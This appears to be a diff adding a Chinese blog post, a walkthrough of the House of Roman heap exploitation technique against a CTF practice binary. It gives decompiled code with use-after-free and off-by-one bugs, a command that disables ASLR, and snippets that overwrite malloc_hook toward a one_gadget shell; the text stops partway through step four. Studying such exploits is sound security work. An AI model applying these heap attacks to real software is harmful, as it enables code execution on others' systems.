@@ -1,0 +1,713 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="House系列,">
+
+
+
+
+  
+
+
+  <link rel="alternate" href="/atom.xml" title="mutou-jun's blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1">
+
+
+
+
+
+
+<meta name="description" content="停更了快小半年了，罪过呐，重新捡起。最近要努力学堆！！！文章首发于 先知社区。">
+<meta name="keywords" content="House系列">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House-Of-Roman技术分析及例题新解">
+<meta property="og:url" content="http://yoursite.com/2020/04/19/House-Of-Roman技术分析及例题新解/index.html">
+<meta property="og:site_name" content="mutou-jun&#39;s blog">
+<meta property="og:description" content="停更了快小半年了，罪过呐，重新捡起。最近要努力学堆！！！文章首发于 先知社区。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86BoxU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86BmDJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86Bnb9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86BMU1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86BKER.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86Beu4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86BQ4x.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86B1C6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86B38K.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86B8gO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86BGvD.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86BYKe.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86BtDH.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86BNbd.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86BaVA.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/20/86BdUI.png">
+<meta property="og:updated_time" content="2020-04-19T09:17:32.049Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="House-Of-Roman技术分析及例题新解">
+<meta name="twitter:description" content="停更了快小半年了，罪过呐，重新捡起。最近要努力学堆！！！文章首发于 先知社区。">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/03/20/86BoxU.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"right","display":"always"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+  <title> House-Of-Roman技术分析及例题新解 | mutou-jun's blog </title>
+</head>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">mutou-jun's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                House-Of-Roman技术分析及例题新解
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2020-04-19T17:16:59+08:00" content="2020-04-19">
+              2020-04-19
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>停更了快小半年了，罪过呐，重新捡起。最近要努力学堆！！！文章首发于 先知社区。</p>
+<a id="more"></a>
+<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attachk 结合的一个小 trick。<br>该技术用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的。<br>且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。<br> （以来自 ctf wiki）<br>我在学习这部分的 时候 很是迷惑，经过寻找参考资料与自己对该例题长达 一天的时间的调试终于搞懂了了，特记录下来加深对它的理解。<br>该程序可以在这里下载到。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/romanking98/</span>House-Of-Roman</span><br></pre></td></tr></table></figure>
+
+<h1 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h1><p>总体上来说  我们 分为五大步：</p>
+<ol>
+<li>通过低位地址写修改fastbin的fd，修改到malloc_hook-0x23，为我们最后 向 malloc_hook地址里写入 one_gadget 做准备</li>
+<li>修复 fastbin free 链</li>
+<li>通过unsortedbin attack，将main_arean地址写入malloc_hook</li>
+<li>通过低位地址写修改malloc_hook中的地址为one gadget</li>
+<li>free 同一个 chunk 多次，造成 double free 异常，触发 malloc_printerr ，触发malloc,getshell。<h1 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h1>我们检查下保护：</li>
+</ol>
+<p><img src="https://s1.ax1x.com/2020/03/20/86BoxU.png" alt="86BoxU.png"></p>
+<p>开启了 PIE 和 NX保护。<br>为了本地调试方便 我们关闭 本地ASLR </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span>randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<p>我们先来看下程序逻辑：<br>首先让我们 输入 name 到bss 段上，然后 是个菜单，有三个功能    </p>
+<ol>
+<li>Malloc  2. Write   3. Free</li>
+</ol>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 choice; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  start_p();                                    <span class="comment">// Enter name :</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    print_menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;choice);              <span class="comment">// 1. Malloc</span></span><br><span class="line">                                                <span class="comment">// 2. Write</span></span><br><span class="line">                                                <span class="comment">// 3. Free</span></span><br><span class="line">    <span class="keyword">switch</span> ( (_DWORD)choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Malloc"</span>);</span><br><span class="line">        HIDWORD(choice) = (<span class="keyword">unsigned</span> __int64)Malloc();</span><br><span class="line">        <span class="keyword">if</span> ( !HIDWORD(choice) )</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Error"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Write"</span>);</span><br><span class="line">        Write(<span class="string">"Write"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Free"</span>);</span><br><span class="line">        Free(<span class="string">"Free"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>1.MAlloc： maloc的参数 size 并没有限制 大小</p>
+<p>且在 经过gdb 调试：知道 heap_ptr[0]的地址</p>
+<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">heap_ptrs[0] ：0x555555756160</span><br><span class="line"> <span class="function"><span class="keyword">#</span><span class="title">malloc</span><span class="params">(<span class="variable">size</span>)</span></span> : 0x5555557549b8</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc_chunk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *chunk_mem_addr; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp-Ch] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter size of chunk :"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;<span class="built_in">size</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter index :"</span>, &amp;<span class="built_in">size</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x13</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk_mem_addr = <span class="built_in">malloc</span>(<span class="built_in">size</span>);              <span class="comment">// size 无限制</span></span><br><span class="line">    v4 = chunk_mem_addr;</span><br><span class="line">    heap_ptrs[v2] = chunk_mem_addr;</span><br><span class="line">    sizes[v2] = <span class="built_in">size</span>;</span><br><span class="line">    result = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.Write：存在单字节 溢出漏洞</p>
+<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> Write()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 <span class="keyword">id</span>; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  printf(<span class="string">"\nEnter index of chunk :"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;<span class="keyword">id</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="keyword">id</span> &gt; <span class="number">0x13</span> )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">"\nInvalid index"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !heap_ptrs[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="keyword">id</span>] )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">"Bad index"</span>);</span><br><span class="line">  HIDWORD(<span class="keyword">id</span>) = sizes[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="keyword">id</span>];</span><br><span class="line">  printf(<span class="string">"Enter data :"</span>, &amp;<span class="keyword">id</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="keyword">void</span> *)heap_ptrs[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="keyword">id</span>], HIDWORD(<span class="keyword">id</span>) + <span class="number">1</span>);<span class="comment">// off by one</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>Free 这里free 后 并没有将 指针 置为 NULL，存在UAF 漏洞。</li>
+</ol>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Free</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp-4h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nEnter index :"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x13</span> )</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)heap_ptrs[v0]);  <span class="comment">//UAF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h1><p>House-Of-Roman</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.通过低位地址写修改fastbin的fd，修改到malloc_hook<span class="number">-0</span><span class="keyword">x</span><span class="number">23</span>，为我们最后 向 malloc_hook地址里写入 one_gadget 做准备</span><br><span class="line"><span class="number">2</span>.修复过程中的fastbin，</span><br><span class="line"><span class="number">3</span>.通过unsortedbin attack，将main_arean地址写入malloc_hook</span><br><span class="line"><span class="number">4</span>.通过低位地址写修改malloc_hook中的地址为<span class="keyword">one</span> gadget</span><br><span class="line"><span class="number">5</span>.<span class="keyword">free</span> 同一个 chunk 多次，造成 <span class="keyword">double</span> <span class="keyword">free</span> 异常，触发 malloc_printerr ，触发<span class="keyword">malloc</span>,getshell。</span><br></pre></td></tr></table></figure>
+
+<p>第一步:<br>通过低位地址写修改fastbin的fd，修改到malloc_hook-0x23，为我们最后 向 malloc_hook地址里写入 one_gadget 做准备</p>
+<p>我们将这步 给细化下吧。<br>首先 进行堆内存布局，<br>即申请 3个 chunk ，heap_ptrs[0]， heap_ptrs[1]， heap_ptrs[2] ，</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0x18</span>,<span class="number">0</span>) # heap_ptrs[<span class="number">0</span>]      #off_by_one 可修改 heap_ptrs[<span class="number">1</span>] chunk 的size，为后面做准备</span><br><span class="line">malloc(<span class="number">0xc0</span>,<span class="number">1</span>) # heap_ptrs[<span class="number">1</span>]      #通过低位地址写修改 fastbin(heap_ptrs[<span class="number">1</span>]对应的chunk size 为 <span class="number">0x70</span>)的fd，</span><br><span class="line">                                    #修改到malloc_hook<span class="number">-0x23</span>.</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="number">2</span>) # heap_ptrs[<span class="number">2</span>]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2020/03/20/86BmDJ.png" alt="86BmDJ.png"><br>在 heap_ptrs[1] 对应的chunk_addr+0x78 处 伪造  size，为后面的攻击做准备。</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake = <span class="string">"A"</span>*0x68</span><br><span class="line">fake += p64(0x61)  <span class="comment"># fake size</span></span><br><span class="line">write(1,fake)</span><br></pre></td></tr></table></figure>
+
+<p>然后将  heap_ptrs[1] 对应的chunk free进 unsigned bin中，于是 heap_ptrs[1] 对应的chunk 的chunk的 fd (+0x10)与 bk(+0x18) 处都为 main_arena+88 （ 0x7ffff7dd1b78 ）<br><br><img src="https://s1.ax1x.com/2020/03/20/86Bnb9.png" alt="86Bnb9.png"><br>然后接着 申请 3个 chunk，heap_ptrs[3]（与heap_ptrs[2]同大小）， heap_ptrs[15]， heap_ptrs[18] ，并同时 通过单字节溢出将 heap_ptrs[1]的size  也给覆盖成 0x71(70+1)<br>其中，<br>heap_ptrs[15] 用于后面 修复 fast bin链<br>heap_ptrs[18] 0x555555756160（ heap_ptrs[0] ）+0x8*18  即0x555555757250    用于 最后一步 double free 这个 chunk。<br>heap_ptrs[3]  把它与 heap_ptrs[2] 先后 给free 掉，放入 0x70 大小的 fast bin中注意下此时的 bin的结构）<br>即 heap_ptrs[3] 对应的chunk的fd(+0x10)指向了 heap_ptrs[2] 对应的chunk</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">free</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">free</span><span class="params">(<span class="number">3</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2020/03/20/86BMU1.png" alt="86BMU1.png"><br>因为此时 heap_ptrs[1]对应的chunk 的fd（+0x10）指向的地址是  main_arena+88 （ 0x7ffff7dd1b78 ），我们可以 修改 heap_ptrs[3]为 heap_ptrs[1]对应的chunk_addr:（通过单字节 写 实现）,</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">over</span> = <span class="string">"\x20"</span></span><br><span class="line"><span class="built_in">write</span>(<span class="number">3</span>,<span class="keyword">over</span>)</span><br></pre></td></tr></table></figure>
+
+<p>从而 heap_ptrs[3] 对应的chunk的fd(+0x10)指向了 heap_ptrs[1] 对应的chunk， heap_ptrs[1] 对应的chunk 的fd(+0x10)指向了  main_arena+88 （ 0x7ffff7dd1b78 ）<br><img src="https://s1.ax1x.com/2020/03/20/86BKER.png" alt="86BKER.png"><br><br><br>然后 再 通过低位地址写修改 fastbin（ heap_ptrs[1] 对应的chunk size 为 0x70）的fd，修改到malloc_hook-0x23.<br><img src="https://s1.ax1x.com/2020/03/20/86Beu4.png" alt="86Beu4.png"></p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># malloc_hook--&gt;[0x7ffff7dd1b10]</span></span><br><span class="line">malloc_hook_0x23 = <span class="string">"\xed\x1a"</span> <span class="comment">#__malloc_hook - 0x23 </span></span><br><span class="line">write(1,malloc_hook_0x23)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2020/03/20/86BQ4x.png" alt="86BQ4x.png"><br><br>从而 完成第一步。</p>
+<h2 id="第二步-："><a href="#第二步-：" class="headerlink" title="第二步 ："></a>第二步 ：</h2><p>修复0x70 大小的 fastbin链，<br>当我们 可通过 3 次申请 0x70大小的chunk 申请到 含有 malloc_hook的 chunk，把它放入 heap_ptr[0]</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>x60,<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>x60,<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>x60,<span class="number">0</span>)</span></span> <span class="selector-id">#chunk_addr</span> is malloc_hook-<span class="number">0</span>x23</span><br></pre></td></tr></table></figure>
+
+<p>申请后的，此时的fast bin链<br><img src="https://s1.ax1x.com/2020/03/20/86B1C6.png" alt="86B1C6.png"><br>我们用前面 创建好的 heapptr[15] 恢复 fast bin 链</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">free</span><span class="params">(<span class="number">15</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">write</span><span class="params">(<span class="number">15</span>,p64(<span class="number">0</span>)</span></span>)</span><br></pre></td></tr></table></figure>
+
+<p>从而 完成第二步。<br><br><br><img src="https://s1.ax1x.com/2020/03/20/86B38K.png" alt="86B38K.png"><br><br><br>第三步：<br>通过unsortedbin attack，将main_arean地址写入malloc_hook<br>unsortedbin attack的具体实现方式  大家参考这篇博客，有图示，很容易理解。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/qq_41453285/</span>article<span class="regexp">/details/</span><span class="number">99329694</span></span><br></pre></td></tr></table></figure>
+
+<p>为了unsortedbin attack攻击顺利，我们首先更新下 heap_ptr[1], heap_ptr[2],heap_ptr[3] ,heap_ptr[4]  </p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>xc0,<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>x18,<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>xc0,<span class="number">3</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>xc0,<span class="number">4</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>此时heap[0]对应的chunk 是含有 malloc_hook的chunk，我们可通过它 实现 我们的第四步攻击：通过低位地址写修改malloc_hook中的地址为one gadget，后面再说这个。<br><br><img src="https://s1.ax1x.com/2020/03/20/86B8gO.png" alt="86B8gO.png"><br><br>我们把heap[1]对应的chunk 给free 进 unsigned bin中，<br>首先free(1)<br>heap[1]对应的chunk 的fd (+0x10)和 bk(+0x18) 都指向 main_arena+88 ,<br><img src="https://s1.ax1x.com/2020/03/20/86BGvD.png" alt="86BGvD.png"><br>利用unsigned attack 攻击，我们通过覆盖 heap[1]对应的chunk  bk(+0x18) 的低字节，将其改为 malloc_hook 地址 -0x10 处。<br>然后再malloc 同样 size 的chunk 可使得 malloc_hook地址的内容为  （main_arena + 0x88） 0x7ffff7dd1b78</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">over = <span class="string">"B"</span>*<span class="number">8</span></span><br><span class="line">over += <span class="string">"\x00\x1b"</span></span><br><span class="line"><span class="function"><span class="title">write</span><span class="params">(<span class="number">1</span>,over)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>xc0,<span class="number">1</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>完成 第三步。<br><br><img src="https://s1.ax1x.com/2020/03/20/86BYKe.png" alt="86BYKe.png"></p>
+<h2 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h2><p>通过低位地址写修改malloc_hook中的地址为one gadget，后面再说这个。<br>我们看下libc 加载地址：<br><img src="https://s1.ax1x.com/2020/03/20/86BtDH.png" alt="86BtDH.png"><br>查看 one_gadget,这里我们使用 0xf02a4 那个。<br><img src="https://s1.ax1x.com/2020/03/20/86BNbd.png" alt="86BNbd.png"><br>他在内存中的地址应该为 hex(0x7ffff7a0d000+0xf02a4) 即 0x7ffff7afd2a4，它与 main_arena + 0x88） 0x7ffff7dd1b78 只有后6位 不同，<br>我们利用 修改 此时的heapptr[1]对应的chunk 将 malloc_hook中的地址中的内容的 后六位 给覆盖成  afd2a4 即可</p>
